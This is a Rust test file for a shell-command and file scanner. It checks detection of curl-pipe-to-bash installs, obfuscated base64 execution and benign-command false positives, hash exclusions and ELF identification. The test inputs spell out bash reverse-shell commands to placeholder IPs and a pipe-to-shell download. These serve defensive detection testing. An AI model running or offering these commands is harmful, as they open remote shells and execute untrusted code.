use kernlock_core::{analyze_command, analyze_file_bytes, PolicyConfig, RuleEngine, Severity};

#[test]
fn detects_curl_pipe_to_bash() {
    let rules = RuleEngine::builtin();
    let res = analyze_command(
        "curl -fsSL https://example.invalid/install.sh | bash",
        &rules,
    );
    assert!(res.is_suspicious);
    assert!(res.risk_score >= 85);
    assert_eq!(res.severity, Severity::Critical);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-CMD-001"));
}

#[test]
fn detects_bash_reverse_shell() {
    let rules = RuleEngine::builtin();
    let res = analyze_command("bash -i >& /dev/tcp/192.0.2.10/4444 0>&1", &rules);
    assert!(res.is_suspicious);
    assert_eq!(res.severity, Severity::Critical);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-CMD-002"));
}

#[test]
fn detects_base64_obfuscated_eval() {
    let rules = RuleEngine::builtin();
    let res = analyze_command("echo aWQK | base64 -d | sh", &rules);
    assert!(res.is_suspicious);
    assert!(res.matches.iter().any(|m| m.rule_id == "KL-CMD-004"));
}

#[test]
fn allows_benign_commands_without_false_positive() {
    let rules = RuleEngine::builtin();
    let benign = [
        "ls -la /home/user/projects",
        "git status && cargo test",
        "python3 -m http.server 8080",
        "curl -sS https://api.github.com/zen",
    ];
    for cmd in benign {
        let res = analyze_command(cmd, &rules);
        assert!(
            !res.is_suspicious,
            "False positive on benign command: {}",
            cmd
        );
        assert_eq!(res.risk_score, 0);
    }
}

#[test]
fn scans_harmless_test_script_fixture_and_respects_exclusions() {
    let rules = RuleEngine::builtin();
    let mut policy = PolicyConfig::default();

    let harmless_fixture =
        b"#!/bin/bash\n# Harmless test fixture\nbash -i >& /dev/tcp/198.51.100.1/9001 0>&1\n";
    let res = analyze_file_bytes("/tmp/test_fixture.sh", harmless_fixture, &rules, &policy);
    assert!(res.is_suspicious);
    assert!(!res.excluded);
    assert!(res.file_type.contains("Shell"));
    assert!(res.risk_score >= 90);

    // Exclude by SHA-256 hash
    policy.excluded_hashes.push(res.sha256.clone());
    let res_excluded =
        analyze_file_bytes("/tmp/test_fixture.sh", harmless_fixture, &rules, &policy);
    assert!(res_excluded.excluded);
    assert!(!res_excluded.is_suspicious);
    assert_eq!(res_excluded.risk_score, 0);
}

#[test]
fn detects_elf_header_without_executing() {
    let rules = RuleEngine::builtin();
    let policy = PolicyConfig::default();
    let mut fake_elf = vec![0x7f, b'E', b'L', b'F', 2, 1, 1, 0];
    fake_elf.extend_from_slice(&[0u8; 64]);
    let res = analyze_file_bytes("/usr/local/bin/sample", &fake_elf, &rules, &policy);
    assert_eq!(res.file_type, "ELF executable/shared-object");
    assert!(!res.is_suspicious);
}
